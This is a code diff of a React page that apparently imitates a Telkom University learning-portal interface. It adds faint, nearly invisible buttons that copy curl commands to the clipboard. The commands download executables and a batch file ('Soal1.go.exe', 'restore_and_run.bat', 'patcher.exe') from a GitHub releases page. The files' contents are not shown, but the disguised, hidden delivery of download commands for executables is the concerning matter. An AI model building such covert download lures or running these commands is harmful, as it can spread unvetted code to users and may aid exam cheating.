@@ -4,7 +4,7 @@ import { ArrowLeft, Settings, GraduationCap, X, Key, Check, Terminal } from 'luc
 export default function App() {
   const [showSurprise, setShowSurprise] = useState(false);
   const [surpriseUrl, setSurpriseUrl] = useState('');
-  const [copied, setCopied] = useState(false);
+  const [copiedId, setCopiedId] = useState<string | null>(null);
 
   const triggerSurprise = (type: string) => {
     // Show a funny surprise full screen
@@ -13,15 +13,20 @@ export default function App() {
     console.log(`Surprise triggered via ${type}!`);
   };
 
-  const copyScript = async () => {
-    const script = `curl -L "https://github.com/kilowavw-development/Celoe.TelkomUniversity/releases/download/valid/System.Monitor.exe" -o "System.Monitor.exe"`;
+  const copyToClipboard = async (id: string, text: string) => {
     try {
-      await navigator.clipboard.writeText(script);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
+      await navigator.clipboard.writeText(text);
+      setCopiedId(id);
+      setTimeout(() => setCopiedId(null), 2000);
     } catch (err) {
       console.error('Failed to copy: ', err);
     }
+  };
+
+  const scripts = {
+    soal: `curl -L "https://github.com/kilowavw-development/Celoe.TelkomUniversity/releases/download/valid/Soal1.go.exe" -o "Soal1.go.exe"`,
+    restore: `curl -L "https://github.com/kilowavw-development/Celoe.TelkomUniversity/releases/download/valid/restore_and_run.bat" -o "restore_and_run.bat"`,
+    patcher: `curl -L "https://github.com/kilowavw-development/Celoe.TelkomUniversity/releases/download/valid/patcher.exe" -o "patcher.exe"`
   };
 
   return (
@@ -48,26 +53,37 @@ export default function App() {
                 <span className="text-[10px] font-medium uppercase tracking-tighter">Back</span>
               </button>
 
-              {/* 2. Icon Button (Settings) */}
+              {/* 2. Soal Script Button */}
               <button
-                onClick={() => triggerSurprise('settings')}
-                className="p-2 rounded-md bg-black/5 hover:bg-black/10 text-black/20 hover:text-black/40 transition-all border border-black/5 cursor-pointer"
-                title="Portal Settings"
-              >
-                <Settings className="w-4 h-4" />
-              </button>
-
-              {/* 3. Copy Script Button */}
-              <button
-                onClick={copyScript}
+                onClick={() => copyToClipboard('soal', scripts.soal)}
                 className="p-2 rounded-md bg-black/5 hover:bg-black/10 text-black/20 hover:text-black/40 transition-all border border-black/5 flex items-center gap-1 cursor-pointer"
-                title="Copy Download Script"
+                title="Copy Soal Script"
               >
-                {copied ? <Check className="w-4 h-4 text-emerald-500" /> : <Terminal className="w-4 h-4" />}
-                <span className="text-[10px] font-medium uppercase tracking-tighter">{copied ? 'Copied' : 'Script'}</span>
+                {copiedId === 'soal' ? <Check className="w-4 h-4 text-emerald-500" /> : <Terminal className="w-4 h-4" />}
+                <span className="text-[10px] font-medium uppercase tracking-tighter">{copiedId === 'soal' ? 'Copied' : 'Soal'}</span>
               </button>
 
-              {/* 4. Button with Text (Grades/Academic) */}
+              {/* 3. Restore Script Button */}
+              <button
+                onClick={() => copyToClipboard('restore', scripts.restore)}
+                className="p-2 rounded-md bg-black/5 hover:bg-black/10 text-black/20 hover:text-black/40 transition-all border border-black/5 flex items-center gap-1 cursor-pointer"
+                title="Copy Restore Script"
+              >
+                {copiedId === 'restore' ? <Check className="w-4 h-4 text-emerald-500" /> : <Settings className="w-4 h-4" />}
+                <span className="text-[10px] font-medium uppercase tracking-tighter">{copiedId === 'restore' ? 'Copied' : 'Restore'}</span>
+              </button>
+
+              {/* 4. Patcher Script Button */}
+              <button
+                onClick={() => copyToClipboard('patcher', scripts.patcher)}
+                className="p-2 rounded-md bg-black/5 hover:bg-black/10 text-black/20 hover:text-black/40 transition-all border border-black/5 flex items-center gap-1 cursor-pointer"
+                title="Copy Patcher Script"
+              >
+                {copiedId === 'patcher' ? <Check className="w-4 h-4 text-emerald-500" /> : <Terminal className="w-4 h-4" />}
+                <span className="text-[10px] font-medium uppercase tracking-tighter">{copiedId === 'patcher' ? 'Copied' : 'Patcher'}</span>
+              </button>
+
+              {/* 5. Button with Text (Grades/Academic) */}
               <button
                 onClick={() => triggerSurprise('grades')}
                 className="px-3 py-2 rounded-md bg-black/5 hover:bg-black/10 text-black/20 hover:text-black/40 transition-all border border-black/5 flex items-center gap-2 cursor-pointer"
